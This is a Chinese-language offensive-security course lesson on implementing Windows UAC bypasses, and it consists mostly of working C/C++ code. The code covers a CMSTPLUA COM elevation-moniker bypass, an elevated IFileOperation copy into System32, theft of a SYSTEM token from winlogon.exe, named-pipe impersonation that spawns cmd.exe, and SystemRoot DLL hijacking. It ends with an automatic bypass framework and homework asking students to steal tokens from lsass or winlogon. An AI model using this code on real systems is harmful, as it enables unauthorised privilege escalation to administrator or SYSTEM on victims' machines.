# 课时16：代码实现UAC绕过

## 1. 课程目标

深入学习UAC绕过的代码实现技术，包括COM对象劫持、Token复制等高级方法。

### 1.1 学习目标

- 掌握COM对象劫持绕过UAC
- 学习Token复制提权技术
- 了解环境变量劫持方法
- 实现自动化UAC绕过框架

---

## 2. 名词解释

| 名词 | 英文 | 解释 |
|------|------|------|
| **COM** | Component Object Model | 组件对象模型 |
| **CLSID** | Class ID | COM类标识符 |
| **ICMLuaUtil** | - | 可自动提权的COM接口 |
| **Token** | - | 访问令牌，包含权限信息 |
| **Impersonation** | - | 模拟，使用其他用户的Token |
| **Named Pipe** | - | 命名管道，用于Token窃取 |

---

## 3. COM对象劫持

### 3.1 ICMLuaUtil接口

```cpp
#include <windows.h>
#include <stdio.h>

// ICMLuaUtil接口定义
const IID IID_ICMLuaUtil = { 
    0x6EDD6D74, 0xC007, 0x4E75, 
    { 0xB7, 0x6A, 0xE5, 0x74, 0x09, 0x95, 0xE2, 0x4C } 
};

const CLSID CLSID_CMSTPLUA = { 
    0x3E5FC7F9, 0x9A51, 0x4367, 
    { 0x9A, 0xC8, 0xA4, 0xEC, 0xFC, 0x9A, 0xEE, 0x0A } 
};

// ICMLuaUtil虚函数表
typedef interface ICMLuaUtil ICMLuaUtil;

typedef struct ICMLuaUtilVtbl {
    // IUnknown
    HRESULT(STDMETHODCALLTYPE* QueryInterface)(ICMLuaUtil* This, REFIID riid, void** ppvObject);
    ULONG(STDMETHODCALLTYPE* AddRef)(ICMLuaUtil* This);
    ULONG(STDMETHODCALLTYPE* Release)(ICMLuaUtil* This);
    
    // ICMLuaUtil
    HRESULT(STDMETHODCALLTYPE* Method1)(ICMLuaUtil* This);
    HRESULT(STDMETHODCALLTYPE* Method2)(ICMLuaUtil* This);
    HRESULT(STDMETHODCALLTYPE* Method3)(ICMLuaUtil* This);
    HRESULT(STDMETHODCALLTYPE* Method4)(ICMLuaUtil* This);
    HRESULT(STDMETHODCALLTYPE* Method5)(ICMLuaUtil* This);
    HRESULT(STDMETHODCALLTYPE* Method6)(ICMLuaUtil* This);
    HRESULT(STDMETHODCALLTYPE* ShellExec)(
        ICMLuaUtil* This,
        LPCWSTR lpFile,
        LPCWSTR lpParameters,
        LPCWSTR lpDirectory,
        ULONG fMask,
        ULONG nShow
    );
} ICMLuaUtilVtbl;

interface ICMLuaUtil {
    CONST_VTBL struct ICMLuaUtilVtbl* lpVtbl;
};

// 使用CMSTPLUA COM对象绕过UAC
BOOL BypassUACViaCMSTPLUA(LPCWSTR szCommand) {
    printf("[*] UAC绕过 - CMSTPLUA COM对象\n");
    
    HRESULT hr;
    ICMLuaUtil* pCMLuaUtil = NULL;
    BIND_OPTS3 bo;
    
    // 初始化COM
    hr = CoInitializeEx(NULL, COINIT_APARTMENTTHREADED);
    if (FAILED(hr)) {
        printf("[-] CoInitialize失败: 0x%X\n", hr);
        return FALSE;
    }
    
    // 创建Elevation Moniker
    ZeroMemory(&bo, sizeof(bo));
    bo.cbStruct = sizeof(bo);
    bo.hwnd = GetForegroundWindow();
    bo.dwClassContext = CLSCTX_LOCAL_SERVER;
    
    // 使用Elevation:Administrator!创建提权的COM对象
    WCHAR szMoniker[256];
    wsprintfW(szMoniker, 
              L"Elevation:Administrator!new:{3E5FC7F9-9A51-4367-9A8C-A4ECFC9AEE0A}");
    
    hr = CoGetObject(szMoniker, &bo, IID_ICMLuaUtil, (void**)&pCMLuaUtil);
    if (FAILED(hr)) {
        printf("[-] CoGetObject失败: 0x%X\n", hr);
        CoUninitialize();
        return FALSE;
    }
    printf("[+] COM对象创建成功\n");
    
    // 调用ShellExec执行命令
    hr = pCMLuaUtil->lpVtbl->ShellExec(
        pCMLuaUtil,
        szCommand,      // 要执行的程序
        NULL,           // 参数
        NULL,           // 工作目录
        0,              // 掩码
        SW_SHOW         // 显示方式
    );
    
    if (FAILED(hr)) {
        printf("[-] ShellExec失败: 0x%X\n", hr);
    } else {
        printf("[+] 命令执行成功!\n");
    }
    
    // 清理
    pCMLuaUtil->lpVtbl->Release(pCMLuaUtil);
    CoUninitialize();
    
    return SUCCEEDED(hr);
}
```

### 3.2 IFileOperation接口

```cpp
#include <windows.h>
#include <shobjidl.h>
#include <stdio.h>

// 使用IFileOperation复制文件到System32（绕过UAC）
BOOL CopyToSystem32ViaIFileOperation(LPCWSTR szSrc, LPCWSTR szDst) {
    HRESULT hr;
    IFileOperation* pFileOp = NULL;
    IShellItem* pFrom = NULL;
    IShellItem* pTo = NULL;
    
    CoInitializeEx(NULL, COINIT_APARTMENTTHREADED);
    
    // 创建提权的IFileOperation
    BIND_OPTS3 bo = { sizeof(bo) };
    bo.dwClassContext = CLSCTX_LOCAL_SERVER;
    bo.hwnd = GetForegroundWindow();
    
    hr = CoGetObject(
        L"Elevation:Administrator!new:{3AD05575-8857-4850-9277-11B85BDB8E09}",
        &bo, IID_PPV_ARGS(&pFileOp)
    );
    
    if (FAILED(hr)) {
        printf("[-] 创建IFileOperation失败\n");
        CoUninitialize();
        return FALSE;
    }
    
    // 设置操作标志
    pFileOp->SetOperationFlags(
        FOF_NOCONFIRMATION | 
        FOF_SILENT | 
        FOFX_NOCOPYHOOKS | 
        FOFX_REQUIREELEVATION
    );
    
    // 创建源和目标ShellItem
    SHCreateItemFromParsingName(szSrc, NULL, IID_PPV_ARGS(&pFrom));
    SHCreateItemFromParsingName(szDst, NULL, IID_PPV_ARGS(&pTo));
    
    // 执行复制
    pFileOp->CopyItem(pFrom, pTo, NULL, NULL);
    hr = pFileOp->PerformOperations();
    
    // 清理
    if (pFrom) pFrom->Release();
    if (pTo) pTo->Release();
    pFileOp->Release();
    CoUninitialize();
    
    return SUCCEEDED(hr);
}
```

---

## 4. Token复制提权

### 4.1 从高权限进程窃取Token

```cpp
#include <windows.h>
#include <tlhelp32.h>
#include <stdio.h>

// 启用权限
BOOL EnablePrivilege(LPCWSTR lpszPrivilege) {
    HANDLE hToken;
    TOKEN_PRIVILEGES tp;
    LUID luid;
    
    if (!OpenProcessToken(GetCurrentProcess(), 
                          TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken)) {
        return FALSE;
    }
    
    if (!LookupPrivilegeValueW(NULL, lpszPrivilege, &luid)) {
        CloseHandle(hToken);
        return FALSE;
    }
    
    tp.PrivilegeCount = 1;
    tp.Privileges[0].Luid = luid;
    tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
    
    AdjustTokenPrivileges(hToken, FALSE, &tp, sizeof(tp), NULL, NULL);
    CloseHandle(hToken);
    
    return GetLastError() == ERROR_SUCCESS;
}

// 从指定进程窃取Token并创建进程
BOOL StealTokenAndCreateProcess(DWORD dwPid, LPCWSTR szCommand) {
    printf("[*] 从PID %d窃取Token\n", dwPid);
    
    // 启用SeDebugPrivilege
    if (!EnablePrivilege(SE_DEBUG_NAME)) {
        printf("[-] 启用SeDebugPrivilege失败\n");
    }
    
    // 打开目标进程
    HANDLE hProcess = OpenProcess(PROCESS_QUERY_INFORMATION, FALSE, dwPid);
    if (!hProcess) {
        printf("[-] 打开进程失败: %d\n", GetLastError());
        return FALSE;
    }
    
    // 获取进程Token
    HANDLE hToken;
    if (!OpenProcessToken(hProcess, TOKEN_DUPLICATE | TOKEN_QUERY, &hToken)) {
        printf("[-] 打开Token失败: %d\n", GetLastError());
        CloseHandle(hProcess);
        return FALSE;
    }
    
    // 复制Token
    HANDLE hDupToken;
    if (!DuplicateTokenEx(hToken, TOKEN_ALL_ACCESS, NULL, 
                          SecurityImpersonation, TokenPrimary, &hDupToken)) {
        printf("[-] 复制Token失败: %d\n", GetLastError());
        CloseHandle(hToken);
        CloseHandle(hProcess);
        return FALSE;
    }
    printf("[+] Token复制成功\n");
    
    // 使用窃取的Token创建进程
    STARTUPINFOW si = { sizeof(si) };
    PROCESS_INFORMATION pi = { 0 };
    
    WCHAR szCmd[MAX_PATH];
    wcscpy_s(szCmd, szCommand);
    
    if (!CreateProcessWithTokenW(hDupToken, LOGON_WITH_PROFILE,
                                  NULL, szCmd, CREATE_NEW_CONSOLE,
                                  NULL, NULL, &si, &pi)) {
        printf("[-] CreateProcessWithTokenW失败: %d\n", GetLastError());
        CloseHandle(hDupToken);
        CloseHandle(hToken);
        CloseHandle(hProcess);
        return FALSE;
    }
    
    printf("[+] 进程创建成功! PID: %d\n", pi.dwProcessId);
    
    CloseHandle(pi.hThread);
    CloseHandle(pi.hProcess);
    CloseHandle(hDupToken);
    CloseHandle(hToken);
    CloseHandle(hProcess);
    
    return TRUE;
}

// 查找SYSTEM进程窃取Token
BOOL ElevateViaTokenSteal(LPCWSTR szCommand) {
    // 查找winlogon.exe的PID（运行在SYSTEM权限）
    HANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    PROCESSENTRY32W pe = { sizeof(pe) };
    DWORD dwWinlogonPid = 0;
    
    if (Process32FirstW(hSnap, &pe)) {
        do {
            if (_wcsicmp(pe.szExeFile, L"winlogon.exe") == 0) {
                dwWinlogonPid = pe.th32ProcessID;
                break;
            }
        } while (Process32NextW(hSnap, &pe));
    }
    CloseHandle(hSnap);
    
    if (!dwWinlogonPid) {
        printf("[-] 未找到winlogon.exe\n");
        return FALSE;
    }
    
    return StealTokenAndCreateProcess(dwWinlogonPid, szCommand);
}
```

---

## 5. 命名管道Token窃取

```cpp
#include <windows.h>
#include <stdio.h>

// 通过命名管道窃取客户端Token
DWORD WINAPI PipeServerThread(LPVOID lpParam) {
    LPCWSTR szPipeName = L"\\\\.\\pipe\\EvilPipe";
    
    // 创建命名管道
    HANDLE hPipe = CreateNamedPipeW(
        szPipeName,
        PIPE_ACCESS_DUPLEX,
        PIPE_TYPE_MESSAGE | PIPE_WAIT,
        1, 1024, 1024, 0, NULL
    );
    
    if (hPipe == INVALID_HANDLE_VALUE) {
        printf("[-] 创建管道失败\n");
        return 1;
    }
    
    printf("[*] 等待客户端连接...\n");
    
    // 等待客户端连接
    if (ConnectNamedPipe(hPipe, NULL) || GetLastError() == ERROR_PIPE_CONNECTED) {
        printf("[+] 客户端已连接\n");
        
        // 模拟客户端
        if (ImpersonateNamedPipeClient(hPipe)) {
            printf("[+] 模拟成功\n");
            
            // 获取当前Token
            HANDLE hToken;
            OpenThreadToken(GetCurrentThread(), TOKEN_ALL_ACCESS, TRUE, &hToken);
            
            // 使用Token创建进程
            STARTUPINFOW si = { sizeof(si) };
            PROCESS_INFORMATION pi;
            
            CreateProcessWithTokenW(hToken, 0, NULL, 
                                   L"cmd.exe", CREATE_NEW_CONSOLE,
                                   NULL, NULL, &si, &pi);
            
            CloseHandle(hToken);
            RevertToSelf();
        }
    }
    
    CloseHandle(hPipe);
    return 0;
}
```

---

## 6. 环境变量劫持

```cpp
#include <windows.h>
#include <stdio.h>

// 通过环境变量劫持绕过UAC
// 利用某些自动提权程序会读取环境变量的特性
BOOL BypassUACViaEnvVariable() {
    // 设置恶意的SystemRoot环境变量
    // 某些程序会从%SystemRoot%\System32加载DLL
    
    // 1. 创建恶意目录结构
    CreateDirectoryW(L"C:\\Temp\\FakeRoot", NULL);
    CreateDirectoryW(L"C:\\Temp\\FakeRoot\\System32", NULL);
    
    // 2. 复制恶意DLL到假目录
    // CopyFileW(L"evil.dll", L"C:\\Temp\\FakeRoot\\System32\\version.dll", FALSE);
    
    // 3. 设置环境变量
    SetEnvironmentVariableW(L"SystemRoot", L"C:\\Temp\\FakeRoot");
    
    // 4. 启动目标程序（它会从假的System32加载DLL）
    // ... 
    
    // 5. 恢复环境变量
    SetEnvironmentVariableW(L"SystemRoot", L"C:\\Windows");
    
    return TRUE;
}
```

---

## 7. 综合UAC绕过框架

```cpp
#include <windows.h>
#include <stdio.h>

typedef BOOL(*UAC_BYPASS_FUNC)(LPCWSTR);

// UAC绕过方法列表
struct UAC_METHOD {
    const char* name;
    UAC_BYPASS_FUNC func;
    BOOL(*check)();  // 检查是否适用
};

// 自动选择最佳方法
BOOL AutoBypassUAC(LPCWSTR szCommand) {
    printf("[*] 自动UAC绕过\n");
    
    // 检查当前是否已提权
    BOOL bElevated = FALSE;
    HANDLE hToken;
    if (OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &hToken)) {
        TOKEN_ELEVATION elevation;
        DWORD dwSize;
        if (GetTokenInformation(hToken, TokenElevation, &elevation, 
                               sizeof(elevation), &dwSize)) {
            bElevated = elevation.TokenIsElevated;
        }
        CloseHandle(hToken);
    }
    
    if (bElevated) {
        printf("[+] 已经是管理员权限\n");
        return TRUE;
    }
    
    // 获取Windows版本
    OSVERSIONINFOW osvi = { sizeof(osvi) };
    // ... 版本检测代码
    
    // 尝试各种方法
    printf("[*] 尝试fodhelper方法...\n");
    if (BypassUACViaFodhelper(szCommand)) {
        return TRUE;
    }
    
    printf("[*] 尝试eventvwr方法...\n");
    if (BypassUACViaEventvwr(szCommand)) {
        return TRUE;
    }
    
    printf("[*] 尝试CMSTPLUA方法...\n");
    if (BypassUACViaCMSTPLUA(szCommand)) {
        return TRUE;
    }
    
    printf("[-] 所有方法均失败\n");
    return FALSE;
}
```

---

## 8. 课后作业

### 作业1：COM对象（必做）

实现CMSTPLUA COM对象的UAC绕过。

### 作业2：Token窃取（进阶）

从lsass.exe或winlogon.exe窃取Token并创建提权进程。

### 作业3：自动化框架（高级）

编写自动检测Windows版本并选择最佳UAC绕过方法的工具。

---

## 9. 下一课预告

下一课我们将学习CVE-2019-1388 UAC提权漏洞。
